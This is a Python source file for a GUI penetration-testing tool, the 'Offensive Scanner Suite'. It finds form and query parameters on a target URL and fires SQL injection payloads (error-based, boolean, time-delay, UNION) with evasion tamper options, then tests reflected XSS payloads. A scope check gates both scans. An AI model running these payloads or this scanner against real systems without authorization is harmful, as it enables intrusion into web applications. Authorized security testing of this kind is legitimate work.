import random
import re
import threading
import time
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse

import customtkinter as ctk
import requests
import tkinter as tk
from PIL import ImageTk, Image
from bs4 import BeautifulSoup
from tkinter import filedialog, messagebox

from fingerprinting import fingerprint_url
from session_state import (
    describe_scope,
    get_target,
    is_url_in_scope,
    scope_error,
    set_target,
)
from ui_utils import open_image

REQUEST_TIMEOUT = 7
ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
    re.compile(r"unclosed quotation mark", re.IGNORECASE),
    re.compile(r"odbc sql server", re.IGNORECASE),
    re.compile(r"mysql_fetch", re.IGNORECASE),
    re.compile(r"pg_query", re.IGNORECASE),
]
BOOLEAN_TESTS = [
    ("' OR '1'='1'--", "' AND '1'='2'--"),
    ('" OR "1"="1"--', '" AND "1"="2"--'),
]
TIME_TESTS: List[Tuple[str, float]] = [
    ("';WAITFOR DELAY '0:0:5'--", 4.5),
    ("');SELECT pg_sleep(5)--", 4.5),
]
PROFILE_PAYLOADS: Dict[str, List[str]] = {
    "Light": ["'", "' or '1'='1"],
    "Balanced": ["'", "' OR '1'='1'--", '" OR "1"="1"--', "') OR ('1'='1", "admin' --"],
    "Aggressive": [
        "' UNION SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' OR SLEEP(5)--",
        "') OR SLEEP(5)--",
        "1' ORDER BY 1--",
    ],
}
DEFAULT_MANUAL_PAYLOADS = """' OR '1'='1
' UNION SELECT NULL--
") OR 1=1--
"""


@dataclass
class InjectionPoint:
    method: str
    url: str
    params: Dict[str, str]
    target_param: str

    def signature(self) -> str:
        return f"{self.method.upper()} {self.url} :: {self.target_param}"


def vulnerability_scanner() -> None:
    window = ctk.CTkToplevel()
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("dark-blue")
    window.geometry("1200x820")
    window.title("Offensive Scanner Suite")

    background_image = open_image("dark.png")
    background_image = background_image.resize((window.winfo_screenwidth(), window.winfo_screenheight()), Image.BICUBIC)
    background_photo = ImageTk.PhotoImage(background_image)
    background_label = ctk.CTkLabel(window, image=background_photo)
    background_label.place(x=0, y=0, relwidth=1, relheight=1)

    tabview = ctk.CTkTabview(window, width=1150, height=780)
    tabview.pack(padx=20, pady=20, fill="both", expand=True)
    sql_tab = tabview.add("SQL Injection")
    xss_tab = tabview.add("XSS Analyzer")

    sql_findings: List[Dict[str, str]] = []
    xss_findings: List[str] = []

    # Shared helpers -----------------------------------------------------
    def load_global_target(entry: ctk.CTkEntry) -> None:
        target = get_target()
        if not target:
            messagebox.showinfo("Global Target", "Configure a target in the main dashboard first.")
            return
        entry.delete(0, tk.END)
        entry.insert(0, target)

    def log_fingerprint(text_widget: tk.Text, url: str) -> None:
        if not url:
            return
        text_widget.insert(tk.END, f"[+] Fingerprinting {url}\n")
        text_widget.see(tk.END)
        try:
            fp = fingerprint_url(url)
            text_widget.insert(tk.END, fp.to_report())
        except Exception as exc:  # noqa: BLE001
            text_widget.insert(tk.END, f"Fingerprint failed: {exc}\n")
        text_widget.see(tk.END)

    # SQL TAB ------------------------------------------------------------
    sql_tab.grid_columnconfigure(0, weight=1)
    sql_tab.grid_columnconfigure(1, weight=1)

    scope_label = ctk.CTkLabel(sql_tab, text=describe_scope())
    scope_label.grid(row=0, column=0, sticky="w", padx=10, pady=(10, 0))

    url_entry = ctk.CTkEntry(sql_tab, width=420)
    url_entry.grid(row=1, column=0, padx=10, pady=10, sticky="w")
    if get_target():
        url_entry.insert(0, get_target())

    use_global_button = ctk.CTkButton(sql_tab, text="Use Global Target", command=lambda: load_global_target(url_entry))
    use_global_button.grid(row=1, column=1, padx=10, pady=10, sticky="w")

    focus_label = ctk.CTkLabel(sql_tab, text="Focus parameters (comma separated, optional)")
    focus_label.grid(row=2, column=0, padx=10, pady=(0, 5), sticky="w")
    focus_var = tk.StringVar()
    focus_entry = ctk.CTkEntry(sql_tab, width=420, textvariable=focus_var)
    focus_entry.grid(row=3, column=0, padx=10, pady=(0, 10), sticky="w")

    profile_label = ctk.CTkLabel(sql_tab, text="Detection profile")
    profile_label.grid(row=2, column=1, padx=10, pady=(0, 5), sticky="w")
    profile_var = tk.StringVar(value="Balanced")
    profile_combo = ctk.CTkComboBox(sql_tab, values=list(PROFILE_PAYLOADS.keys()), variable=profile_var, width=200)
    profile_combo.grid(row=3, column=1, padx=10, pady=(0, 10), sticky="w")

    manual_payloads_label = ctk.CTkLabel(sql_tab, text="Manual / custom payloads")
    manual_payloads_label.grid(row=4, column=0, padx=10, pady=(5, 0), sticky="w")
    manual_payloads = tk.Text(sql_tab, height=6, width=60, bg="black", fg="white")
    manual_payloads.insert("1.0", DEFAULT_MANUAL_PAYLOADS)
    manual_payloads.grid(row=5, column=0, columnspan=2, padx=10, pady=5, sticky="we")

    def load_payload_file() -> None:
        file_path = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if not file_path:
            return
        with open(file_path, "r", encoding="utf-8", errors="ignore") as handle:
            data = handle.read()
        manual_payloads.delete("1.0", tk.END)
        manual_payloads.insert("1.0", data)

    payload_button = ctk.CTkButton(sql_tab, text="Load payload file", command=load_payload_file)
    payload_button.grid(row=6, column=0, padx=10, pady=(0, 10), sticky="w")

    tamper_frame = ctk.CTkFrame(sql_tab)
    tamper_frame.grid(row=6, column=1, padx=10, pady=(0, 10), sticky="w")
    tamper_label = ctk.CTkLabel(tamper_frame, text="Tamper helpers")
    tamper_label.pack(anchor="w", pady=(5, 0))
    urlencode_var = tk.IntVar(value=0)
    urlencode_check = ctk.CTkCheckBox(tamper_frame, text="URL encode payloads", variable=urlencode_var)
    urlencode_check.pack(anchor="w")
    randomcase_var = tk.IntVar(value=0)
    randomcase_check = ctk.CTkCheckBox(tamper_frame, text="Randomize casing", variable=randomcase_var)
    randomcase_check.pack(anchor="w")
    commentwrap_var = tk.IntVar(value=1)
    commentwrap_check = ctk.CTkCheckBox(tamper_frame, text="Append comment terminator", variable=commentwrap_var)
    commentwrap_check.pack(anchor="w")

    delay_label = ctk.CTkLabel(sql_tab, text="Delay between payloads (s)")
    delay_label.grid(row=7, column=0, padx=10, pady=(0, 5), sticky="w")
    delay_var = tk.DoubleVar(value=0.2)
    delay_entry = ctk.CTkEntry(sql_tab, width=120, textvariable=delay_var)
    delay_entry.grid(row=8, column=0, padx=10, pady=(0, 10), sticky="w")

    sql_results = tk.Text(sql_tab, height=18, width=100, bg="black", fg="#00ff9d")
    sql_results.grid(row=9, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")

    status_label = ctk.CTkLabel(sql_tab, text="Idle")
    status_label.grid(row=10, column=0, padx=10, pady=(0, 10), sticky="w")

    sql_tab.grid_rowconfigure(9, weight=1)

    def mutate_payload(payload: str) -> str:
        value = payload
        if commentwrap_var.get():
            value = value.rstrip("-") + "--+"
        if randomcase_var.get():
            value = ''.join(random.choice((c.lower(), c.upper())) for c in value)
        if urlencode_var.get():
            value = quote(value, safe='')
        return value

    def detect_error_indicator(text: str) -> Optional[str]:
        for pattern in ERROR_PATTERNS:
            if pattern.search(text):
                return pattern.pattern
        return None

    def send_request(session: requests.Session, point: InjectionPoint, payload: str) -> Tuple[Optional[requests.Response], float]:
        params = dict(point.params)
        params[point.target_param] = payload
        start = time.time()
        try:
            if point.method == "post":
                resp = session.post(point.url, data=params, timeout=REQUEST_TIMEOUT)
            else:
                resp = session.get(point.url, params=params, timeout=REQUEST_TIMEOUT)
            elapsed = time.time() - start
            return resp, elapsed
        except requests.RequestException as exc:
            sql_results.insert(tk.END, f"[!] {point.signature()} failed: {exc}\n")
            return None, 0.0

    def discover_injection_points(session: requests.Session, url: str) -> List[InjectionPoint]:
        points: List[InjectionPoint] = []
        parsed = urlparse(url)
        base_url = parsed._replace(query="", fragment="").geturl()
        query_params = parse_qs(parsed.query)
        for param in query_params:
            params = {k: (v[0] if v else '') for k, v in query_params.items()}
            points.append(InjectionPoint(method="get", url=base_url, params=params, target_param=param))
        try:
            response = session.get(url, timeout=REQUEST_TIMEOUT)
            response.raise_for_status()
        except requests.RequestException:
            return points
        soup = BeautifulSoup(response.text, "html.parser")
        for form in soup.find_all("form"):
            method = (form.get("method") or "get").lower()
            action = urljoin(url, form.get("action") or url)
            form_params: Dict[str, str] = {}
            for input_field in form.find_all("input"):
                name = input_field.get("name")
                if not name:
                    continue
                default = input_field.get("value") or ""
                form_params[name] = default
            for select in form.find_all("select"):
                name = select.get("name")
                if name and name not in form_params:
                    form_params[name] = ""
            for param in form_params:
                points.append(InjectionPoint(method=method, url=action, params=form_params, target_param=param))
        return points

    def run_sql_scan() -> None:
        target_url = url_entry.get().strip()
        if not target_url:
            messagebox.showerror("Target", "Provide a URL to test.")
            return
        if not is_url_in_scope(target_url):
            messagebox.showerror("Scope", scope_error(target_url))
            return
        set_target(target_url)
        scope_label.configure(text=describe_scope())
        sql_results.delete("1.0", tk.END)
        sql_findings.clear()
        status_label.configure(text="Discovering parameters...")

        focus_params = {param.strip().lower() for param in focus_var.get().split(',') if param.strip()}
        manual = [line.strip() for line in manual_payloads.get("1.0", tk.END).splitlines() if line.strip()]
        payload_profile = PROFILE_PAYLOADS.get(profile_var.get(), [])
        payloads = payload_profile + manual
        if not payloads:
            messagebox.showerror("Payloads", "No payloads provided.")
            return

        log_fingerprint(sql_results, target_url)

        def worker() -> None:
            session = requests.Session()
            points = discover_injection_points(session, target_url)
            if focus_params:
                points = [p for p in points if p.target_param.lower() in focus_params]
            if not points:
                sql_results.insert(tk.END, "No parameters or forms discovered.\n")
                status_label.configure(text="Idle")
                return
            sql_results.insert(tk.END, f"[+] Testing {len(points)} injection point(s).\n")
            sql_results.see(tk.END)

            for point in points:
                sql_results.insert(tk.END, f"\n--- {point.signature()} ---\n")
                sql_results.see(tk.END)
                for payload in payloads:
                    mutated = mutate_payload(payload)
                    response, elapsed = send_request(session, point, mutated)
                    if response is None:
                        continue
                    indicator = detect_error_indicator(response.text)
                    if indicator:
                        finding = {
                            "location": point.signature(),
                            "payload": payload,
                            "type": "Error-based",
                            "evidence": indicator,
                        }
                        sql_findings.append(finding)
                        sql_results.insert(tk.END, f"[ERROR] {payload} -> {indicator}\n")
                        sql_results.see(tk.END)
                        break
                    time.sleep(max(delay_var.get(), 0))
                else:
                    # Boolean-based checks
                    for true_payload, false_payload in BOOLEAN_TESTS:
                        resp_true, _ = send_request(session, point, mutate_payload(true_payload))
                        resp_false, _ = send_request(session, point, mutate_payload(false_payload))
                        if resp_true and resp_false and abs(len(resp_true.text) - len(resp_false.text)) > 80:
                            finding = {
                                "location": point.signature(),
                                "payload": true_payload,
                                "type": "Boolean-based",
                                "evidence": "response length delta",
                            }
                            sql_findings.append(finding)
                            sql_results.insert(tk.END, f"[BOOLEAN] {point.target_param} appears injectable.\n")
                            break
                    else:
                        for payload, threshold in TIME_TESTS:
                            resp, elapsed = send_request(session, point, mutate_payload(payload))
                            if resp and elapsed > threshold:
                                finding = {
                                    "location": point.signature(),
                                    "payload": payload,
                                    "type": "Time-based",
                                    "evidence": f"delay {elapsed:.2f}s",
                                }
                                sql_findings.append(finding)
                                sql_results.insert(tk.END, f"[TIME] {point.target_param} delayed {elapsed:.2f}s.\n")
                                break
                sql_results.see(tk.END)
            status_label.configure(text=f"Scan finished ({len(sql_findings)} finding(s))")

        threading.Thread(target=worker, daemon=True).start()

    run_button = ctk.CTkButton(sql_tab, text="Run SQLi scan", command=run_sql_scan)
    run_button.grid(row=10, column=1, padx=10, pady=(0, 10), sticky="e")

    def export_sql_findings() -> None:
        if not sql_findings:
            messagebox.showinfo("Export", "No SQLi findings yet.")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if not file_path:
            return
        with open(file_path, "w", encoding="utf-8") as handle:
            for finding in sql_findings:
                handle.write(
                    f"Location: {finding['location']}\nType: {finding['type']}\nPayload: {finding['payload']}\nEvidence: {finding['evidence']}\n\n"
                )
        messagebox.showinfo("Export", f"Findings saved to {file_path}")

    export_button = ctk.CTkButton(sql_tab, text="Export SQLi findings", command=export_sql_findings)
    export_button.grid(row=11, column=1, padx=10, pady=(0, 10), sticky="e")

    # XSS TAB ------------------------------------------------------------
    xss_tab.grid_columnconfigure(0, weight=1)
    xss_tab.grid_columnconfigure(1, weight=1)

    xss_scope = ctk.CTkLabel(xss_tab, text=describe_scope())
    xss_scope.grid(row=0, column=0, padx=10, pady=(10, 0), sticky="w")

    xss_url_entry = ctk.CTkEntry(xss_tab, width=420)
    xss_url_entry.grid(row=1, column=0, padx=10, pady=10, sticky="w")
    if get_target():
        xss_url_entry.insert(0, get_target())

    load_xss_button = ctk.CTkButton(xss_tab, text="Use Global Target", command=lambda: load_global_target(xss_url_entry))
    load_xss_button.grid(row=1, column=1, padx=10, pady=10, sticky="w")

    xss_payloads_label = ctk.CTkLabel(xss_tab, text="Payloads")
    xss_payloads_label.grid(row=2, column=0, padx=10, pady=(0, 5), sticky="w")
    xss_payloads = tk.Text(xss_tab, height=6, width=60, bg="black", fg="white")
    xss_payloads.insert("1.0", "<script>alert(1)</script>\n\" onmouseover=alert(1)\n'><img src=x onerror=alert(1)>")
    xss_payloads.grid(row=3, column=0, columnspan=2, padx=10, pady=5, sticky="we")

    def load_xss_payloads() -> None:
        file_path = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if not file_path:
            return
        with open(file_path, "r", encoding="utf-8", errors="ignore") as handle:
            data = handle.read()
        xss_payloads.delete("1.0", tk.END)
        xss_payloads.insert("1.0", data)

    load_xss_payload_button = ctk.CTkButton(xss_tab, text="Load payload file", command=load_xss_payloads)
    load_xss_payload_button.grid(row=4, column=0, padx=10, pady=(0, 10), sticky="w")

    xss_results = tk.Text(xss_tab, height=18, width=100, bg="black", fg="#ffcc00")
    xss_results.grid(row=5, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")
    xss_tab.grid_rowconfigure(5, weight=1)

    xss_status = ctk.CTkLabel(xss_tab, text="Idle")
    xss_status.grid(row=6, column=0, padx=10, pady=(0, 10), sticky="w")

    def run_xss_scan() -> None:
        target_url = xss_url_entry.get().strip()
        if not target_url:
            messagebox.showerror("Target", "Provide a URL to test.")
            return
        if not is_url_in_scope(target_url):
            messagebox.showerror("Scope", scope_error(target_url))
            return
        set_target(target_url)
        xss_scope.configure(text=describe_scope())
        payloads = [line.strip() for line in xss_payloads.get("1.0", tk.END).splitlines() if line.strip()]
        if not payloads:
            messagebox.showerror("Payloads", "Provide at least one payload.")
            return
        xss_results.delete("1.0", tk.END)
        xss_findings.clear()
        xss_status.configure(text="Scanning...")
        log_fingerprint(xss_results, target_url)

        def worker() -> None:
            try:
                response = requests.get(target_url, timeout=REQUEST_TIMEOUT)
                response.raise_for_status()
            except requests.RequestException as exc:
                xss_results.insert(tk.END, f"Failed to fetch {target_url}: {exc}\n")
                xss_status.configure(text="Failed")
                return
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")

            def send_form(form, payload):
                data = {}
                for input_field in form.find_all("input"):
                    name = input_field.get("name")
                    if not name:
                        continue
                    field_type = (input_field.get("type") or "text").lower()
                    if field_type in ["submit", "button"]:
                        continue
                    data[name] = payload
                if not data:
                    return None
                action = urljoin(target_url, form.get("action") or target_url)
                method = (form.get("method") or "get").lower()
                if method == "post":
                    return requests.post(action, data=data, timeout=REQUEST_TIMEOUT)
                return requests.get(action, params=data, timeout=REQUEST_TIMEOUT)

            for payload in payloads:
                reflected = False
                if forms:
                    for form in forms:
                        try:
                            resp = send_form(form, payload)
                        except requests.RequestException as exc:
                            xss_results.insert(tk.END, f"Form submit failed: {exc}\n")
                            continue
                        if resp and payload in resp.text:
                            reflected = True
                            break
                if not forms:
                    crafted = target_url
                    if '?' in target_url:
                        parsed = urlparse(target_url)
                        params = parse_qs(parsed.query)
                        query = urlencode({k: payload for k in params})
                        crafted = parsed._replace(query=query).geturl()
                    else:
                        crafted = f"{target_url}?payload={payload}"
                    try:
                        resp = requests.get(crafted, timeout=REQUEST_TIMEOUT)
                        if payload in resp.text:
                            reflected = True
                    except requests.RequestException as exc:
                        xss_results.insert(tk.END, f"Payload {payload} failed: {exc}\n")
                if reflected:
                    xss_findings.append(payload)
                    xss_results.insert(tk.END, f"[+] Reflected XSS detected with payload: {payload}\n")
            if not xss_findings:
                xss_results.insert(tk.END, "No reflected payloads detected.\n")
                xss_status.configure(text="Completed - no findings")
            else:
                xss_status.configure(text=f"Completed ({len(xss_findings)} finding(s))")

        threading.Thread(target=worker, daemon=True).start()

    xss_run_button = ctk.CTkButton(xss_tab, text="Run XSS scan", command=run_xss_scan)
    xss_run_button.grid(row=6, column=1, padx=10, pady=(0, 10), sticky="e")

    def export_xss() -> None:
        if not xss_findings:
            messagebox.showinfo("Export", "No XSS findings yet.")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if not file_path:
            return
        with open(file_path, "w", encoding="utf-8") as handle:
            handle.write("\n".join(xss_findings))
        messagebox.showinfo("Export", f"Saved to {file_path}")

    export_xss_button = ctk.CTkButton(xss_tab, text="Export XSS findings", command=export_xss)
    export_xss_button.grid(row=7, column=1, padx=10, pady=(0, 10), sticky="e")

    back_button = ctk.CTkButton(window, text="Close", command=window.destroy)
    back_button.place(relx=0.9, rely=0.04)

    window.mainloop()
